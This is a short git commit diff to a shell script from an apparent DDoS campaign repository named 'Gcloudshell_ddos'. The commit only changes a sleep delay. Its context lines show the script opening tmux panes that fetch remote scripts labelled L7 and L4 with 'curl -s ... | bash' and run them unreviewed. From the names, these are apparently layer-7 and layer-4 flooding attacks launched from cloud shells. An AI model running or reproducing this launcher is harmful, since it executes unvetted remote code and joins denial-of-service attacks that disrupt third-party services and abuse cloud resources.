85c8a95efad2da2e8a9834a5c4779c82722e0c3a
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-18 08:11:49 +0300

    Update Start_dualShell.sh

--- Start_dualShell.sh
+++ Start_dualShell.sh
@@ -15,7 +15,8 @@ cd ~
 echo -e " \v Operation - Stop russia \v  \v  \v "
 sleep 0.1
 echo -e "For control CPU&RAM usage enter - top\v here"
-sleep 2
+sleep 2.2
+
 tmux split-window -v -p 87 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
 tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
